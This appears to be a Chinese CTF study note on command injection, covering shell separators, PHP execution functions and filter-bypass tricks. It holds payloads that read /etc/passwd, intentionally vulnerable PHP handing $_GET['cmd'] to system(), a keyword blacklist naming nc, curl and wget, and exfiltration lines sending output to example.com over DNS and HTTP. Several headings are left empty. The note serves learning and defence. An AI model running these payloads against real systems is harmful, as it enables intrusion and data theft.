# 命令注入漏洞

允许攻击者向应用程序注入和执行系统命令。这种漏洞通常发生在应用程序未能正确验证或过滤用户输入，使得恶意输入能够直接传递给系统命令执行。

RCE（**R**emote **C**ommand **E**xecution 或 **R**emote **C**ode **E**xecution）即远程命令执行或远程代码执行。

> 代码执行与命令执行的区别？

?> 在学习本节之前，建议先学习[Bash 基础](Basic/Linux/Bash.md)

## 命令分隔符

| 名称 | 示例 | 说明|
|---------|----------|---------|
| `;`    | `whoami;ls` | 命令结束符，允许一行多条命令按顺序执行，所有命令均会运行。Windows 系统下命令提示符`cmd`不支持该语法。|
| `\&\&` | `whoami&&ls` | 逻辑与，仅当第一条命令成功，才执行第二条命令。|
| `\|\|` | `whoami\|\|ls` | 逻辑或，仅当第一条命令失败，才执行第二条命令。|
| `\|`   |  | 管道符，两条命令都执行，第一条命令的输出作为第二条命令的输入，其中第一条命令的输出不显示。|
| `\&`   |  | 后台执行，两个命令同时执行。|
| `%0A`  |  | PHP 环境下使用。|

## 输入输出重定向

`$(ls)`
ls${}${IFS}id

变量
模式扩展

- 花括号扩展
  输出重定向

`command > file`，将输出重定向到 file

## 转义字符

Bash 转义字符反斜杠`\`。

换行符是一个特殊字符，表示命令的结束，Bash 收到这个字符以后，就会对输入的命令进行解释执行。换行符前面加上反斜杠转义，就使得换行符变成一个普通字符，Bash 会将其当作长度为 0 的空字符处理，从而可以将一行命令写成多行。

PHP 中的[escapeshellcmd()](https://www.php.net/manual/zh/function.escapeshellcmd.php)对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。可以使用换行符构造多行命令。

## Linux 下的与文件相关命令

- 列目录、文件

```
/ls|dir/
```

- 读文件内容

```php
/cat|tac|tail|head|more|less|uniq|strings|sort|od|/
```

```php
if (!preg_match('/|dir|nl|nc||flag|sh|cut|awk||od|curl|ping|\*||ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo||cc||\.|{|}|tar|zip|gcc||vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i', $cmd)) {
        echo system($cmd);
  }
```

## PHP 命令执行相关函数

system()、exec() 和 shell_exec() 等函数均通过调用 `/bin/sh -c` 来执行传入的命令字符串。

### [system()](https://www.php.net/manual/zh/function.system.php)

执行命令，并且**显示输出**。成功则返回命令输出的最后一行，失败则返回`false`。

```php
<?php
system('whoami'); // root
echo system('whoami');
/*
 * root
 * root
 * 会输出两个结果，注意，第二个为仅包含最后一行的返回值。
 */
```

### [exec()](https://www.php.net/manual/zh/function.exec.php)

执行命令，**返回**命令输出的最后一行内容。

```php
<?php
exec('whoami'); // 无任何输出
var_dump(exec('whoami'));  // string(4) "root"，输出最后一行内容
```

### [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php)

通过 shell 执行命令并将**完整的输出以字符串的方式返回**

```php
<?php
shell_exec('whoami'); // 无任何输出
var_dump(shell_exec('whoami'));
/*
 * string(5) "root
 * "
 * 原始输出，换行符
 */
```

### [反引号（``）](https://www.php.net/manual/zh/language.operators.execution.php)

执行运算符，将反引号中的内容作为 shell 命令来执行，并将其输出信息返回，**与函数 shell_exec() 相同。**

```php
<?php
`whoami`; // 无任何输出
var_dump(`whoami`);
/*
 * string(5) "root
 * "
 * 原始输出，换行符
 */
```

### [passthru()](https://www.php.net/manual/zh/function.passthru.php)

执行外部程序并且显示**原始**输出

成功时返回 null， 或者在失败时返回 false。

```php
<?php
passthru('whoami'); // root
var_dump(passthru('whoami'));
/*
 * root
 * NULL
 */
```

### [pcntl_exec](https://www.php.net/manual/zh/function.pcntl-exec.php)

在当前进程空间执行指定程序

```php
pcntl_exec("/bin/bash",array($_POST["cmd"]));
pcntl_exec("/bin/bash",array('whoami'));
```

### [popen](https://www.php.net/manual/zh/function.popen.php)

打开进程文件指针

### [proc_open()](https://www.php.net/manual/zh/function.proc-open.php)

执行一个命令，并且打开用来输入/输出的文件指针

```php
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // 标准输入，子进程从此管道中读取数据
   1 => array("pipe", "w"),  // 标准输出，子进程向此管道中写入数据
   2 => array("file", "/tmp/error-output.txt", "a") // 标准错误，写入到一个文件
);

echo proc_open('whoami', $descriptorspec, $pipes);

```

可以赋给一个变量而不是简单地丢弃到标准输出

## 绕过技巧

<style>
  .markmap {
    width: 100%;
    height: 500px;
  }
</style>

```markmap
# RCE绕过技巧

## 绕过空格
- IFS
- {}
- 十六进制
## 绕过黑名单
- 字符类
 - 单引号、双引号
 - 反引号
 - 转义字符
- 变量
 - 变量拼接
 - 未初始化的变量
- 编码转换
 - Base64
 - 十六进制
 - 大小写
 - 逆序
- 模式扩展
## 长度限制绕过
- 五字符
- 四字符
## 无数字字母
 - 123

## 无回显
- 反弹shell
- DNS信道
- HTTP信道
```

### 绕过空格

```php
<?php
highlight_file(__FILE__);

// 获取用户输入的命令
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : die("No command provided");

// 过滤用户输入的命令：移除空格
$cmd = str_replace(" ", "", $cmd);

// 输出用户输入的命令（转义以防止 XSS）
echo "CMD: " . htmlspecialchars($cmd) . "<br>";

// 执行命令
system($cmd);
```

- `$IFS`、`${IFS}`、`$IFS$9`

环境变量 IFS（**I**nternal **F**ield **S**eparator，内部字段分隔符），默认情况下由`空格`、`制表符`和`换行符`组成，可通过`set`命令查看。

`${IFS}`使用`{}`可以避免出现变量名与其他字符连用的情况。`$9`是当前命令的第 9 个参数，通常为空。习惯上，使用`$IFS$9`可避免避免变量名连用，也不出现花括号。

```bash
cat$IFS/etc/passwd
cat${IFS}flag
cat$IFS$9flag
```

- [大括号扩展](https://wangdoc.com/bash/expansion#%E5%A4%A7%E6%8B%AC%E5%8F%B7%E6%89%A9%E5%B1%95)`{...}`

```bash
{cat,/etc/passwd}
```

- 重定向运算符

```bash
# 输入重定向
cat</etc/passwd

# 读写
cat<>/etc/passwd
```

- `$'string'`特殊类型的单引号（ANSI-C Quoting）

`$''`属于[特殊的单引号](https://www.gnu.org/software/bash/manual/bash.html#ANSI_002dC-Quoting)，支持转义字符。

```bash
# 十六进制
X=$'cat\x20/etc/passwd';$X

# 换行符
x=$'cat\n/etc/passwd';$x
x=$'cat\t/etc/passwd';$x
```

- 使用制表符

```bash
;ls%09-al%09/home
```

- 变量截取

### 绕过黑名单

```php
<?php
highlight_file(__FILE__);

// 获取用户输入的命令
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : die("No command provided");

// 检查用户输入的命令是否包含黑名单中的命令
$blacklist = ['ls', 'cat', 'flag'];
foreach ($blacklist as $value) {
    if (stripos($cmd, $value) !== false) {
        die("HACKER!");
    }
}

// 输出用户输入的命令（转义以防止 XSS）
echo "CMD: " . htmlspecialchars($cmd) . "<br>";

// 执行命令
system($cmd);
```

- 引号（单引号、双引号、反引号）

```sh
# 单引号
w'h'o'am'i
wh''oami

# 双引号
w"h"o"am"i
wh""oami

# 反引号\`
wh``oami
```

- 反斜线`\`（转义字符）

```sh
wh\oami
```

转义字符（%5C）和换行符（%0A）连用，实现命令续行，以下是经 URL 编码示例：

```
ca%5C%0At%20/et%5C%0Ac/pa%5C%0Asswd
```

- 变量

```sh
# 变量拼接
a=f;b=lag;cat $a$b # cat flag

# 未初始化的变量，等价于null
ca${u}t f${u}lag
```

- 模式扩展

```bash
# 通配符`?`代表任意单个字符，不包括空字符，如果匹配多个字符，需要多个`?`连用
cat fla?
cat fl??

# 通配符`*`代表任意数量的任意字符，包括零个字符
cat f*

# 方括号扩展[]
cat [f]lag

# 花括号扩展{}
cat {f,}lag

# 子命令扩展
cat /fla$(u)g
cat /fla`u`g
```

- 编码转换

```bash
# base64
echo "d2hvYW1pCg=="|base64 -d|sh # whoami
echo "d2hvYW1pCg=="|base64 -d|$0 # whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64

# 逆序,bash
$(rev<<<'imaohw') # whoami

# 大小写
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")

# 十六进制

```

- 位置参数的特殊变量`$@`和`$*`

`$@`和`$*`代表全部的位置参数，当没有位置参数时，扩展为空。如，``

```bash
who$@ami
who$*ami
```

### 绕过管道符`|`

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

### 反斜杠`\`和斜杠`/`绕过

```bash
# ${varname:offset:length} 子字符串
cat ${HOME:0:1}etc${HOME:0:1}passwd

# 字符替换
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### 绕过 IP 限制

```bash
127.0.0.1 == 2130706433
```

### 绕过长度限制

#### 15 位

#### 命令执行 5 位 （HITCON 2017 Quals Babyfirst Revenge）

```php
<?php
$sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
    @exec($_GET['cmd']);
} else if (isset($_GET['reset'])) {
    @exec('/bin/rm -rf ' . $sandbox);
}
highlight_file(__FILE__);
```

#### 命令执行 4 位（HITCON 2017 Quals Babyfirst Revenge v2）

```php
<?php
$sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
    @exec($_GET['cmd']);
} else if (isset($_GET['reset'])) {
    @exec('/bin/rm -rf ' . $sandbox);
}
highlight_file(__FILE__);
```

### 无回显

- 反弹 shell

<https://your-shell.com/>

- 结果写入文件，二次返回

主要利用是输出重定向符号`>`将标准输出重定向到`可写`、`可访问`的目录下。

```bash
# 将输出结果保存到当前目录下的1.txt文件
ls -al>1.txt
```

- DNS 信道

利用 DNS 解析特殊构造的域名，通过查看 DNS 解析记录获得结果。平台有 [dnslog.cn](http://dnslog.cn/)、[https://requestrepo.com/](https://requestrepo.com/)

```bash
ping `whoami`.example.com
curl `whoami`.example.com
wget -O- `ls|base64`.example.com
```

- HTTP 信道

利用 HTTP 协议，GET 或 POST 请求，获取结果。通常，如果数据量大，通过 POST 方法。

[https://requestrepo.com/](https://requestrepo.com/)

```bash
# 通过URL传送
curl example.com/`whoami`
curl example.com/`ls|base64`
wget -O- example.com/`ls|base64`

# 通过POST
curl -X POST --data `ls|base64` example.com
wget --post-data "$(ls|base64)" -O- example.com
```

- 延时

## 经典赛题分析

## 参考资料

- <https://book.hacktricks.xyz/v/cn/linux-hardening/bypass-bash-restrictions>
- <https://github.com/PortSwigger/command-injection-attacker/blob/master/README.md>

- <https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html>
- <https://cwe.mitre.org/data/definitions/77.html>
- <https://paper.seebug.org/164/>
